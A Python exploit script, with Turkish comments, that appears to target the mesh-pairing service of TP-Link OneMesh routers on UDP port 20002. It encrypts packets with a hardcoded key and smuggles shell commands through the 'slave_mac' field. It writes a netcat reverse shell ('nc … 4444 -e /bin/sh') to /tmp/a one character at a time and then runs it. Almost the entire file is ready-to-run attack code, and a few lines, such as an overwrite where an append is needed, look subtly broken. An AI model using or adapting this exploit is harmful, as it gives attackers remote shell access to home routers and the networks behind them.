import socket
import struct
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import zlib
import time

KEY = b'TPONEMESH_Kf!xn?'[:16]
IV = b'1234567890abcdef'

def create_cipher():
    return AES.new(KEY, AES.MODE_CBC, IV)

def calculate_checksum(packet_data):
    m_data = bytearray(packet_data)
    struct.pack_into('<I', m_data, 12, 0x5a6b7c8d)
    return zlib.crc32(m_data) & 0xffffffff

def create_tdp_packet(opcode, payload_json):
    cipher = create_cipher()
    json_str = json.dumps(payload_json)
    encrypted_payload = cipher.encrypt(pad(json_str.encode(), AES.block_size))
    
    header = bytearray(16)
    header[0] = 0x01
    header[1] = 0xf0
    struct.pack_into('<H', header, 2, opcode)
    struct.pack_into('<H', header, 4, 16 + len(encrypted_payload))
    header[6] = 0x01
    
    full_packet = bytearray(header) + bytearray(encrypted_payload)
    checksum = calculate_checksum(full_packet)
    struct.pack_into('<I', full_packet, 12, checksum)
    
    return bytes(full_packet)

TARGET_IP = "192.168.68.1"
TARGET_PORT = 20002

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 1. Aşama: attach_master
print("[*] Mesh bağlantısı başlatılıyor...")
attach_payload = {
    "method": "attach_master",
    "data": {
        "group_id": "-1",
        "master_mac": "AA:BB:CC:DD:EE:FF"
    }
}
attach_packet = create_tdp_packet(opcode=0x0004, payload_json=attach_payload)
sock.sendto(attach_packet, (TARGET_IP, TARGET_PORT))
time.sleep(0.5)

# 2. Aşama: Çok aşamalı komut oluşturma
def send_slave_offer(slave_mac_cmd):
    """slave_mac parametresiyle komut gönder"""
    payload = {
        "method": "slave_key_offer",
        "data": {
            "group_id": "-1",
            "ip": "192.168.68.100",
            "slave_mac": slave_mac_cmd,
            "slave_private_account": "dummy",
            "slave_private_password": "dummy",
            "want_to_join": False,
            "model": "RE300",
            "product_type": "RangeExtender",
            "operation_mode": "RE"
        }
    }
    packet = create_tdp_packet(opcode=0x0006, payload_json=payload)
    sock.sendto(packet, (TARGET_IP, TARGET_PORT))
    time.sleep(0.3)

# /tmp/a dosyasına reverse shell betiği yaz
print("[*] /tmp/a dosyasına reverse shell yazılıyor...")

# Dosyayı temizle
send_slave_offer("';> /tmp/a;'")
time.sleep(0.5)

# Shebang ekle
shebang = "#!/bin/sh"
for char in shebang:
    if char == "'":
        send_slave_offer(f"';echo -n \"'\">>/tmp/a;'")
    elif char == " ":
        send_slave_offer(f"';echo -n ' '>>/tmp/a;'")
    elif char == "!":
        send_slave_offer(f"';echo -n '!'>/tmp/a;'")
    else:
        send_slave_offer(f"';echo -n '{char}'>>/tmp/a;'")
    time.sleep(0.2)

send_slave_offer("';echo >> /tmp/a;'")  # Yeni satır
time.sleep(0.3)

# Netcat reverse shell komutu
# nc 192.168.68.X 4444 -e /bin/sh
attacker_ip = "192.168.68.100"  # KENDİ IP'NİZİ YAZIN
attacker_port = "4444"
cmd = f"nc {attacker_ip} {attacker_port} -e /bin/sh"

print(f"[*] Reverse shell komutu yazılıyor: {cmd}")
for char in cmd:
    if char == "'":
        send_slave_offer(f"';echo -n \"'\">>/tmp/a;'")
    elif char == " ":
        send_slave_offer(f"';echo -n ' '>>/tmp/a;'")
    else:
        send_slave_offer(f"';echo -n '{char}'>>/tmp/a;'")
    time.sleep(0.2)

send_slave_offer("';echo >> /tmp/a;'")  # Yeni satır
time.sleep(0.3)

# Dosyayı çalıştırılabilir yap
send_slave_offer("';chmod +x /tmp/a;'")
time.sleep(0.5)

print("[*] Reverse shell betiği hazır: /tmp/a")
print(f"[*] Netcat listener başlatın: nc -lvnp 4444")
print("[*] Betiği çalıştırmak için Enter'a basın...")
input()

# Betiği çalıştır
send_slave_offer("';/tmp/a &;'")
print("[+] Reverse shell tetiklendi!")

sock.close()